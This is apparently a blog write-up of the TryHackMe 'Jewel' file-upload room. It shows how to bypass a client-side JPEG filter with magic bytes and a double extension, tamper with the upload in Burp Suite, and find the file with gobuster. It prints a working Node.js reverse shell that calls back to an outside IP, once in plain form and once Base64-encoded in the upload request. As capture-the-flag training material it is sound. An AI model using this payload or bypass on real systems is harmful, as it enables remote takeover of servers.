---
layout: post
title:  "TryHackMe - File Upload Vulnerabilities - Jewel Writeup"
date:   2023-02-15 15:33:00 +0100
category: "Cyber-Security"
---

I started out by visiting the web-page though Burp Suite's browser, which generated a sitemap:
The page appeared to advertise uploading a photo of some kind, so I tested uploading standard `jpg`, and `gif` files.

The JPEG file was able to be uploaded, but the GIF file was blocked for being too large. This put the upload limit somewhere between 21KB and 484KB.

By now the sitemap had mostly filled out, which showed a `/content` directory, which I guessed would contain the uploaded files, as well as some JavaScript code that appeared to be getting used to filter uploads:
```javascript
// ...
            //Check File Size
            if (event.target.result.length > 50 * 8 * 1024){
                setResponseMsg("File too big", "red");			
                return;
            }
            //Check Magic Number
            if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
                setResponseMsg("Invalid file format", "red");
                return;	
            }
            //Check File Extension
            const extension = fileBox.name.split(".")[1].toLowerCase();
            if (extension != "jpg" && extension != "jpeg"){
                setResponseMsg("Invalid file format", "red");
                return;
            }
// ...
```
This revealed three checks that the developed intended to be satisfied for the file upload to start client-side:
- The file must be smaller than 50KB (`(8 * 1204) * 50`) bits
- The file must have the extension `.jpg` or `.jpeg`
- The file's magic number must be `FF D8 FF`
However, due to poor programming practices, the requirement for the file to have the `.jpg` or `.jpeg` extension was actually a requirement for the first string following a period to be `jpg` or `jpeg`, meaning that `filename.jpg.js` would be a valid extension.

Knowing this, the reverse shell payload would have to have the first 6 bytes set to `C5 B8 C3 98 C5 B8` and the filename as `shell.jpg.realextension`

However, additional enumeration needed to be done in order to figure out what type of payload to send. I used Burp Suite's request inspector to determine what type of back-end server was hosting the site:

```HTTP
HTTP/1.1 304 Not Modified
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 23 Jan 2023 14:15:31 GMT
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 03 Jul 2020 20:57:40 GMT
ETag: W/"5ea-173167875a0"
Front-End-Https: on
```

The server was running `express.js` on Ubuntu. As such, I started looking for potential webshell or reverse shell payloads that could work.
Express is a framework on top of `node.js`, so I found a nodeJS payload I could use:
```node
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.11.22.67", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
I then renamed that file to `shell.jpg.js`, and added the additional magic number bytes.

Unfortunately, this returned an "Invalid File Format" error.
Looking at the magic number check again, I noticed that it split at a comma first, so I decided to try adding a comment and a comma in front of the magic numbers, which didn't work.

I also noticed the `aotb()` function call, and after some research I found it was decoding Base64 data into ASCII text.  As such, I assumed that the signature was some string of characters starting with `ÿØÿ` that was Base64 encoded, then placed in some list of comma separated items as the second item.

However, after some testing, I found that the data was passed to the JavaScript code as a Base64 encoded string already, so it didn't need to be encoded manually. I then used a hex editor to add the magic number bytes to the file, bypassing the client side filter.

I then used Burp Suite to intercept the upload request to the server, and modified the `Content-Type` header, the `type` field in the request, and the `content-length` to match a JPEG image upload.
```http
POST / HTTP/1.1
Host: jewel.uploadvulns.thm
Content-Length: 606
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
    Content-Type: application/json
Origin: http://jewel.uploadvulns.thm
Referer: http://jewel.uploadvulns.thm/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
"name":"payload.jpg.js",
"type":"image/jpeg",
"file":"data:image/jpeg;base64,/9j/2w0KKGZ1bmN0aW9uKCl7DQogICAgdmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLA0KICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwNCiAgICAgICAgc2ggPSBjcC5zcGF3bigic2giLCBbXSk7DQogICAgdmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7DQogICAgY2xpZW50LmNvbm5lY3QoNDQ0NSwgIjEwLjExLjIyLjY3IiwgZnVuY3Rpb24oKXsNCiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOw0KICAgICAgICBzaC5zdGRvdXQucGlwZShjbGllbnQpOw0KICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOw0KICAgIH0pOw0KICAgIHJldHVybiAvYS87IC8vIFByZXZlbnRzIHRoZSBOb2RlLmpzIGFwcGxpY2F0aW9uIGZyb20gY3Jhc2hpbmcNCn0pKCk7DQo="
}
```

The upload then was able to complete successfully.

---

To assist with enumeration, I had been supplied with a word-list of filenames. Based on the fact that they were 3 character long filenames as seen in the sitemap, I guessed that the file had been uploaded to `/content` with a random 3 character long name. 

I set up `gobuster` to enumerate these file names using combinations of the `.jpg` and `.js` extensions:
```bash
=gobuster dir -u http://jewel.uploadvulns.thm/content -w ~/Downloads/UploadVulnsWordlist.txt -x js,jpg,jpg.js
```

```
2023/01/23 15:38:51 Starting gobuster in directory enumeration mode  
===============================================================  
/ABH.jpg              (Status: 200) [Size: 705442]  
/LKQ.jpg              (Status: 200) [Size: 444808]  
/SAD.jpg              (Status: 200) [Size: 247159]  
/SIK.jpg              (Status: 200) [Size: 395]
```
`/SIK.jpg` appeared to be the backdoor I had uploaded, but it's extension had changed from `.jpg.js` to `.jpg`, meaning that I couldn't run it outright.

I decided to also run a [[gobuster]] scan on the site, which showed several interesting directories that I had missed:
```bash
> gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/directory_scanner/directory_list_2.3_medium.txt
```

```
2023/01/23 15:51:22 Starting gobuster in directory enumeration mode  
===============================================================  
/content              (Status: 301) [Size: 181] [--> /content/]  
/modules              (Status: 301) [Size: 181] [--> /modules/]  
/admin                (Status: 200) [Size: 1238]  
/assets               (Status: 301) [Size: 179] [--> /assets/]  
/Content              (Status: 301) [Size: 181] [--> /Content/]  
/Assets               (Status: 301) [Size: 179] [--> /Assets/]  
/Modules              (Status: 301) [Size: 181] [--> /Modules/]  
/Admin                (Status: 200) [Size: 1238]
```

Notably, the `/admin` page contained a form to load arbitrary modules from the `/modules` directory:
![[Pasted image 20230123161319.png]]

I figured I could use this to execute the code I had uploaded, but I realised that the code I uploaded would immediately error due to the magic numbers put in at the start of the file, so I re-uploaded the file and changed the Base64 contents of the upload in the intercepted request in Burp Suite to be an unmodified payload.

I then reran [[gobuster]], without the previous options to discover `.js` and `.jpg.js` files:
```bash
> > gobuster dir -u http://jewel.uploadvulns.thm/content -w ~/Downloads/UploadVulnsWordlist.txt -x jpg
```
```
2023/01/23 16:09:28 Starting gobuster in directory enumeration mode  
===============================================================  
/ABH.jpg              (Status: 200) [Size: 705442]  
/BVO.jpg              (Status: 200) [Size: 394]  
/EEI.jpg              (Status: 200) [Size: 393]
```

I verified that the `EEI.jpg` file was the updated payload using [[curl]], then ran it using the admin panel with a netcat listener open, which gave me a shell!


Overall, I really enjoyed working through this room. It managed to cover not only common file-upload vulnerabilities, but also using Burp Suite, analysing source code, and enumerating a web server.